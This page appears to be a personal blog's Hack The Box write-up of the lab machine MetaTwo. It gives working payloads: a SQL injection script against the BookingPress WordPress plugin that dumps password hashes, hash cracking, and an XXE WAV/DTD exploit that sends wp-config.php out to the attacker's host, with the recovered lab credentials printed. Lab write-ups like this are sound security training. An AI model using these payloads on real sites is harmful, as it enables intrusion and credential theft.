<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="easy - MetaTwo Machine IP Addr: 10.129.36.200
URL: https://app.hackthebox.com/machines/MetaTwo User flag Webserver found and expecting a specific domain:
~» curl -I 10.129.36.200 HTTP/1.1 302 Moved Temporarily Server: nginx/1.18.0 Date: Wed, 30 Nov 2022 01:22:19 GMT Content-Type: text/html Content-Length: 145 Connection: keep-alive Location: http://metapress.htb/ A wordpress app found:
~» curl -I -H 'Host: metapress.htb' 10.129.36.200 HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Wed, 30 Nov 2022 01:25:00 GMT Content-Type: text/html; charset=UTF-8 Connection: keep-alive X-Powered-By: PHP/8."><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="easy - MetaTwo Machine IP Addr: 10.129.36.200
URL: https://app.hackthebox.com/machines/MetaTwo User flag Webserver found and expecting a specific domain:
~» curl -I 10.129.36.200 HTTP/1.1 302 Moved Temporarily Server: nginx/1.18.0 Date: Wed, 30 Nov 2022 01:22:19 GMT Content-Type: text/html Content-Length: 145 Connection: keep-alive Location: http://metapress.htb/ A wordpress app found:
~» curl -I -H 'Host: metapress.htb' 10.129.36.200 HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Wed, 30 Nov 2022 01:25:00 GMT Content-Type: text/html; charset=UTF-8 Connection: keep-alive X-Powered-By: PHP/8."><meta property="og:title" content><meta property="og:description" content="easy - MetaTwo Machine IP Addr: 10.129.36.200
URL: https://app.hackthebox.com/machines/MetaTwo User flag Webserver found and expecting a specific domain:
~» curl -I 10.129.36.200 HTTP/1.1 302 Moved Temporarily Server: nginx/1.18.0 Date: Wed, 30 Nov 2022 01:22:19 GMT Content-Type: text/html Content-Length: 145 Connection: keep-alive Location: http://metapress.htb/ A wordpress app found:
~» curl -I -H 'Host: metapress.htb' 10.129.36.200 HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Wed, 30 Nov 2022 01:25:00 GMT Content-Type: text/html; charset=UTF-8 Connection: keep-alive X-Powered-By: PHP/8."><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/infosec/htb/machines/easy/metatwo-writeup/"><meta property="article:section" content="infosec"><title>easy - MetaTwo Machine </title><link rel=canonical href=https://www.darvein.net/infosec/htb/machines/easy/metatwo-writeup/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=easy---metatwo-machine>easy - MetaTwo Machine
<a class=heading-link href=#easy---metatwo-machine><i class="fa fa-link" aria-hidden=true></i></a></h1><p>IP Addr: 10.129.36.200</p><p>URL:
<a href=https://app.hackthebox.com/machines/MetaTwo>https://app.hackthebox.com/machines/MetaTwo</a></p><h2 id=user-flag>User flag
<a class=heading-link href=#user-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>Webserver found and expecting a specific domain:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~» curl -I 10.129.36.200
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#0086f7;font-weight:700>302</span> Moved Temporarily
</span></span><span style=display:flex><span>Server: nginx/1.18.0
</span></span><span style=display:flex><span>Date: Wed, <span style=color:#0086f7;font-weight:700>30</span> Nov <span style=color:#0086f7;font-weight:700>2022</span> 01:22:19 GMT
</span></span><span style=display:flex><span>Content-Type: text/html
</span></span><span style=display:flex><span>Content-Length: <span style=color:#0086f7;font-weight:700>145</span>
</span></span><span style=display:flex><span>Connection: keep-alive
</span></span><span style=display:flex><span>Location: http://metapress.htb/
</span></span></code></pre></div><p>A wordpress app found:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~» curl -I -H <span style=color:#0086d2>&#39;Host: metapress.htb&#39;</span> 10.129.36.200
</span></span><span style=display:flex><span>HTTP/1.1 <span style=color:#0086f7;font-weight:700>200</span> OK
</span></span><span style=display:flex><span>Server: nginx/1.18.0
</span></span><span style=display:flex><span>Date: Wed, <span style=color:#0086f7;font-weight:700>30</span> Nov <span style=color:#0086f7;font-weight:700>2022</span> 01:25:00 GMT
</span></span><span style=display:flex><span>Content-Type: text/html; <span style=color:#fb660a>charset</span>=UTF-8
</span></span><span style=display:flex><span>Connection: keep-alive
</span></span><span style=display:flex><span>X-Powered-By: PHP/8.0.24
</span></span><span style=display:flex><span>Set-Cookie: <span style=color:#fb660a>PHPSESSID</span>=6anenfusf1jmkomkc089tg359n; <span style=color:#fb660a>path</span>=/
</span></span><span style=display:flex><span>Expires: Thu, <span style=color:#0086f7;font-weight:700>19</span> Nov <span style=color:#0086f7;font-weight:700>1981</span> 08:52:00 GMT
</span></span><span style=display:flex><span>Cache-Control: no-store, no-cache, must-revalidate
</span></span><span style=display:flex><span>Pragma: no-cache
</span></span><span style=display:flex><span>Link: &lt;http://metapress.htb/wp-json/&gt;; <span style=color:#fb660a>rel</span>=<span style=color:#0086d2>&#34;https://api.w.org/&#34;</span>
</span></span></code></pre></div><p>Something interesting from nmap scanning:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -nv -Pn -sV -sC -O -T4 -oA nmap-scan 10.129.36.200
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>22/tcp   open     ssh            OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   <span style=color:#0086f7;font-weight:700>3072</span> c4b44617d2102d8fec1dc927fecd79ee (RSA)
</span></span><span style=display:flex><span>|   <span style=color:#0086f7;font-weight:700>256</span> 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
</span></span><span style=display:flex><span>|_  <span style=color:#0086f7;font-weight:700>256</span> fd78c0b0e22016fa050debd83f12a4ab (ED25519)
</span></span><span style=display:flex><span>80/tcp   open     http           nginx 1.18.0
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://metapress.htb/
</span></span><span style=display:flex><span>| http-methods:
</span></span><span style=display:flex><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0
</span></span></code></pre></div><p>On the web app UI, booked an appt, I can create events, humm:</p><p><figure class=image-container><a href=../../../../../images/articles/metatwo-writeup/image-20221129214108707.png><img width=image-20221129214108707% src=../../../../../images/articles/metatwo-writeup/image-20221129214108707.png alt=image-20221129214108707></a></figure></p><p>After reviewing the /events page&rsquo;s source code I found this:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#fb660a;font-weight:700>link</span> 
</span></span><span style=display:flex><span>      <span style=color:#ff0086;font-weight:700>rel</span>=<span style=color:#0086d2>&#39;stylesheet&#39;</span> 
</span></span><span style=display:flex><span>      <span style=color:#ff0086;font-weight:700>id</span>=<span style=color:#0086d2>&#39;bookingpress_element_css-css&#39;</span>  
</span></span><span style=display:flex><span>      <span style=color:#ff0086;font-weight:700>href</span>=<span style=color:#0086d2>&#39;http://metapress.htb/wp-content/plugins/ bookingpress-appointment-booking/css/bookingpress_element_theme.css?ver=1.0.10&#39;</span> 
</span></span><span style=display:flex><span>      <span style=color:#ff0086;font-weight:700>media</span>=<span style=color:#0086d2>&#39;all&#39;</span> /&gt;
</span></span></code></pre></div><p>The page is using plugin &ldquo;bookingpress-appointment-booking&rdquo; on version &ldquo;1.0.10&rdquo; and found this SQL vulnerability:
<a href=https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357>https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357</a></p><p>As described in the Document, create an appointment with its shortcode embedded and find the &ldquo;nonce&rdquo;:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~» curl -s <span style=color:#0086d2>&#39;http://metapress.htb/thank-you/?appointment_id=Mw==&#39;</span> | grep -i nonce
</span></span><span style=display:flex><span>var <span style=color:#fb660a>postData</span> = { action:<span style=color:#0086d2>&#39;bookingpress_generate_spam_captcha&#39;</span>, _wpnonce:<span style=color:#0086d2>&#39;221f0d0bf9&#39;</span> };
</span></span></code></pre></div><p>The PoC is working:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>.../infosec/p8/metatwo» cat sql.sh
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic>#!/bin/bash</span>
</span></span><span style=display:flex><span><span style=color:#fb660a>SQLI</span>=<span style=color:#0086d2>&#34;UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -&#34;</span>
</span></span><span style=display:flex><span>curl <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>        -s <span style=color:#0086d2>&#39;http://metapress.htb/wp-admin/admin-ajax.php&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>        --data <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>        <span style=color:#0086d2>&#34;action=bookingpress_front_get_category_services&amp;_wpnonce=221f0d0bf9&amp;category_id=33&amp;total_service=-7502) </span><span style=color:#0086d2>${</span><span style=color:#fb660a>SQLI</span><span style=color:#0086d2>}</span><span style=color:#0086d2>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>.../infosec/p8/metatwo» bash sql.sh  | jq
</span></span><span style=display:flex><span>[
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    <span style=color:#0086d2>&#34;bookingpress_service_id&#34;</span>: <span style=color:#0086d2>&#34;10.5.15-MariaDB-0+deb11u1&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#0086d2>&#34;bookingpress_category_id&#34;</span>: <span style=color:#0086d2>&#34;Debian 11&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#0086d2>&#34;bookingpress_service_name&#34;</span>: <span style=color:#0086d2>&#34;debian-linux-gnu&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#0086d2>&#34;bookingpress_service_price&#34;</span>: <span style=color:#0086d2>&#34;</span><span style=color:#fb660a>$1</span><span style=color:#0086d2>.00&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#0086d2>&#34;bookingpress_service_duration_val&#34;</span>: <span style=color:#0086d2>&#34;2&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#0086d2>&#34;bookingpress_service_duration_unit&#34;</span>: <span style=color:#0086d2>&#34;3&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#0086d2>&#34;bookingpress_service_description&#34;</span>: <span style=color:#0086d2>&#34;4&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#0086d2>&#34;bookingpress_service_position&#34;</span>: <span style=color:#0086d2>&#34;5&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#0086d2>&#34;bookingpress_servicedate_created&#34;</span>: <span style=color:#0086d2>&#34;6&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#0086d2>&#34;service_price_without_currency&#34;</span>: 1,
</span></span><span style=display:flex><span>    <span style=color:#0086d2>&#34;img_url&#34;</span>: <span style=color:#0086d2>&#34;http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/images/placeholder-img.jpg&#34;</span>
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>]
</span></span></code></pre></div><p>Change the query to:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#fb660a>SQLI</span>=<span style=color:#0086d2>&#34;UNION ALL SELECT 1,2,3,4,5,6,7,8,concat(schema_name) FROM information_schema.schemata-- -&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># And the result:</span>
</span></span><span style=display:flex><span>~m» bash sql.sh  | jq <span style=color:#0086d2>&#39;.[] | .bookingpress_servicedate_created&#39;</span>
</span></span><span style=display:flex><span><span style=color:#0086d2>&#34;information_schema&#34;</span>
</span></span><span style=display:flex><span><span style=color:#0086d2>&#34;blog&#34;</span>
</span></span></code></pre></div><p>Listing WP tables:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#fb660a>SQLI</span>=<span style=color:#0086d2>&#34;UNION ALL SELECT 1,2,3,4,5,6,7,8,group_concat(table_name) from information_schema.tables where table_schema = database()-- -&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>~m» bash sql.sh  | jq <span style=color:#0086d2>&#39;.[] | .bookingpress_servicedate_created&#39;</span> | sed <span style=color:#0086d2>&#39;s/,/\n/g&#39;</span>
</span></span><span style=display:flex><span><span style=color:#0086d2>&#34;wp_options
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_term_taxonomy
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_bookingpress_servicesmeta
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_commentmeta
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_users
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_bookingpress_customers_meta
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_bookingpress_settings
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_bookingpress_appointment_bookings
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_bookingpress_customize_settings
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_bookingpress_debug_payment_log
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_bookingpress_services
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_termmeta
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_links
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_bookingpress_entries
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_bookingpress_categories
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_bookingpress_customers
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_bookingpress_notifications
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_usermeta
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_terms
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_bookingpress_default_daysoff
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_comments
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_bookingpress_default_workhours
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_postmeta
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_bookingpress_form_fields
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_bookingpress_payment_logs
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_posts
</span></span></span><span style=display:flex><span><span style=color:#0086d2>wp_term_relationships&#34;</span>
</span></span></code></pre></div><p>Listing passwords:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#fb660a>SQLI</span>=<span style=color:#0086d2>&#34;UNION ALL SELECT 1,2,3,4,5,6,7,8,group_concat(user_login,user_pass) from blog.wp_users-- -&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>~m» bash sql.sh  | jq <span style=color:#0086d2>&#39;.[] | .bookingpress_servicedate_created&#39;</span>
</span></span><span style=display:flex><span><span style=color:#0086d2>&#34;admin</span><span style=color:#fb660a>$P$BGrGrgf2wToBS79i07Rk9sN4Fzk</span><span style=color:#0086d2>.TV.,manager</span><span style=color:#fb660a>$P$B4aNM28N0E</span><span style=color:#0086d2>.tMy/JIcnVMZbGcU16Q70&#34;</span>
</span></span></code></pre></div><p>Trying to crack hashes:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~m» cat hashes.txt
</span></span><span style=display:flex><span><span style=color:#fb660a>$P$BGrGrgf2wToBS79i07Rk9sN4Fzk</span>.TV.
</span></span><span style=display:flex><span><span style=color:#fb660a>$P$B4aNM28N0E</span>.tMy/JIcnVMZbGcU16Q70
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>~m» john -w=/usr/share/dict/rockyou.txt hashes.txt
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>Press <span style=color:#0086d2>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style=color:#fb660a;font-weight:700>for</span> status
</span></span><span style=display:flex><span>partylikearockstar (?)
</span></span></code></pre></div><p>The password worked for WP Login (user manager):</p><p><figure class=image-container><a href=../../../../images/articles/metatwo-writeup/image-20221129225555338.png><img width=image-20221129225555338% src=../../../../images/articles/metatwo-writeup/image-20221129225555338.png alt=image-20221129225555338></a></figure></p><p>We have the ability to upload Media files, and we also know this WP version is vulnerable to XXE:
<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447</a></p><p>We create a vulnerable media file:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>» echo -en <span style=color:#0086d2>&#39;RIFF\x85\x00\x00\x00WAVEiXML\x79\x00\x00\x00&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;</span><span style=color:#0086d2>&#34;&#39;&#34;</span><span style=color:#0086d2>&#39;http://10.10.14.2:8000/xxe.dtd&#39;</span><span style=color:#0086d2>&#34;&#39;&#34;</span><span style=color:#0086d2>&#39;&gt;%remote;%init;%trick;]&gt;\x00&#39;</span> &gt; xxe.wav
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>» file xxe.wav
</span></span><span style=display:flex><span>xxe.wav: RIFF (little-endian) data, WAVE audio
</span></span></code></pre></div><p>And then the malicious xxe.dtd</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=../wp-config.php&#34;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#ff0007;background-color:#0f140f;font-weight:700;font-style:italic>&lt;!ENTITY % init &#34;&lt;!ENTITY &amp;#x25; trick SYSTEM &#39;http://10.10.14.2:8000/?p=%file;&#39;&gt;</span>&#34; &gt;
</span></span></code></pre></div><p>After running a python web server and uploading the malicious WAV file:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>10.129.36.200 - - [29/Nov/2022 23:06:55] <span style=color:#0086d2>&#34;GET /xxe.dtd HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span><span style=display:flex><span>10.129.36.200 - - [29/Nov/2022 23:15:22] <span style=color:#0086d2>&#34;GET /?p=P...&lt;stripped&gt;...NCg== HTTP/1.1&#34;</span> <span style=color:#0086f7;font-weight:700>200</span> -
</span></span></code></pre></div><p>Then decoding it from base64:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-php data-lang=php><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span><span style=color:#0086d2>/** The name of the database for WordPress */</span>
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;DB_NAME&#39;</span>, <span style=color:#0086d2>&#39;blog&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#0086d2>/** MySQL database username */</span>
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;DB_USER&#39;</span>, <span style=color:#0086d2>&#39;blog&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#0086d2>/** MySQL database password */</span>
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;DB_PASSWORD&#39;</span>, <span style=color:#0086d2>&#39;635Aq@TdqrCwXFUZ&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#0086d2>/** MySQL hostname */</span>
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;DB_HOST&#39;</span>, <span style=color:#0086d2>&#39;localhost&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#0086d2>/** Database Charset to use in creating database tables. */</span>
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;DB_CHARSET&#39;</span>, <span style=color:#0086d2>&#39;utf8mb4&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#0086d2>/** The Database Collate type. Don&#39;t change this if in doubt. */</span>
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;DB_COLLATE&#39;</span>, <span style=color:#0086d2>&#39;&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;FS_METHOD&#39;</span>, <span style=color:#0086d2>&#39;ftpext&#39;</span> );
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;FTP_USER&#39;</span>, <span style=color:#0086d2>&#39;metapress.htb&#39;</span> );
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;FTP_PASS&#39;</span>, <span style=color:#0086d2>&#39;9NYS_ii@FyL_p5M2NvJ&#39;</span> );
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;FTP_HOST&#39;</span>, <span style=color:#0086d2>&#39;ftp.metapress.htb&#39;</span> );
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;FTP_BASE&#39;</span>, <span style=color:#0086d2>&#39;blog/&#39;</span> );
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;FTP_SSL&#39;</span>, <span style=color:#fb660a;font-weight:700>false</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#0086d2>/**#@+
</span></span></span><span style=display:flex><span><span style=color:#0086d2> * Authentication Unique Keys and Salts.
</span></span></span><span style=display:flex><span><span style=color:#0086d2> * @since 2.6.0
</span></span></span><span style=display:flex><span><span style=color:#0086d2> */</span>
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;AUTH_KEY&#39;</span>,         <span style=color:#0086d2>&#39;?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n&gt;+3m?.B/:&#39;</span> );
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;SECURE_AUTH_KEY&#39;</span>,  <span style=color:#0086d2>&#39;x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%&#39;</span> );
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;LOGGED_IN_KEY&#39;</span>,    <span style=color:#0086d2>&#39;J+mxCaP4z&lt;g.6P^t`ziv&gt;dd}EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C{qKXy&#39;</span> );
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;NONCE_KEY&#39;</span>,        <span style=color:#0086d2>&#39;SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5&#39;</span> );
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;AUTH_SALT&#39;</span>,        <span style=color:#0086d2>&#39;[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s}d&lt;&amp;M;.,x0z~R&gt;3!D&#39;</span> );
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;SECURE_AUTH_SALT&#39;</span>, <span style=color:#0086d2>&#39;&gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.&#39;</span> );
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;LOGGED_IN_SALT&#39;</span>,   <span style=color:#0086d2>&#39;4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf=&#39;</span> );
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;NONCE_SALT&#39;</span>,       <span style=color:#0086d2>&#39;.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL&#39;</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#0086d2>/**
</span></span></span><span style=display:flex><span><span style=color:#0086d2> * WordPress Database Table prefix.
</span></span></span><span style=display:flex><span><span style=color:#0086d2> */</span>
</span></span><span style=display:flex><span><span style=color:#fb660a>$table_prefix</span> = <span style=color:#0086d2>&#39;wp_&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#0086d2>/**
</span></span></span><span style=display:flex><span><span style=color:#0086d2> * For developers: WordPress debugging mode.
</span></span></span><span style=display:flex><span><span style=color:#0086d2> * @link https://wordpress.org/support/article/debugging-in-wordpress/
</span></span></span><span style=display:flex><span><span style=color:#0086d2> */</span>
</span></span><span style=display:flex><span>define( <span style=color:#0086d2>&#39;WP_DEBUG&#39;</span>, <span style=color:#fb660a;font-weight:700>false</span> );
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#0086d2>/** Absolute path to the WordPress directory. */</span>
</span></span><span style=display:flex><span><span style=color:#fb660a;font-weight:700>if</span> ( ! defined( <span style=color:#0086d2>&#39;ABSPATH&#39;</span> ) ) {
